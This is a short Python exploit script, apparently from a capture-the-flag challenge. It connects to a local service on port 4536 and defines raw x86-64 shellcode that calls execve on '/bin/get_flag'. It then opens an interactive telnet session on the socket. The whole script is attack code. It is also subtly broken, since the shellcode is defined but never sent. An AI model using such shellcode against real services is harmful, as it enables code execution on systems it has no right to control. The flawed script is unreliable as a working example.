#!/usr/bin/env python3
import socket, telnetlib, struct

sock = socket.socket()
sock.connect(('localhost', 4536))

shellcode = b'\x48\xbb\x5f\x66\x6c\x61\x67\x00\x00\x00\x53\x48\xbb\x2f\x62\x69\x6e\x2f\x67\x65\x74\x53\x48\xc7\xc0\x3b\x00\x00\x00\x48\x89\xe7\x48\xc7\xc6\x00\x00\x00\x00\x48\xc7\xc2\x00\x00\x00\x00\x0f\x05'

t = telnetlib.Telnet()
t.sock = sock
t.interact()
